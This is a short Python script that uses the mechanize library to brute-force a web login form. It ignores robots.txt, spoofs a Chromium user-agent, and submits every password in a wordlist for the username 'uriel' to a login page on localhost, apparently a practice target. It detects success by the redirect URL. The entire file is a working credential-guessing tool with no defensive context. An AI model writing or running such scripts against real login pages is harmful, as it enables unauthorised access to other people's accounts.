import mechanize

b = mechanize.Browser()
b.set_handle_robots(False)
b.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]


url = "http://127.0.0.1/ff/login/index.html"
wordlist = "wordlist.txt"

try:
    wordlist = open(wordlist, "r")
except :
    print (" Wordlist Not Found!")
    quit()

for password in wordlist:
    response = b.open(url)
    b.select_form(nr=0)
    b.form['username'] = 'uriel'
    b.form['password'] = password.strip()
    b.method = 'POST'
    response = b.submit()


    if response.geturl() == "http://127.0.0.1/ff/login/welcome.php":
        print ("Password Found : " + password.strip())
        break
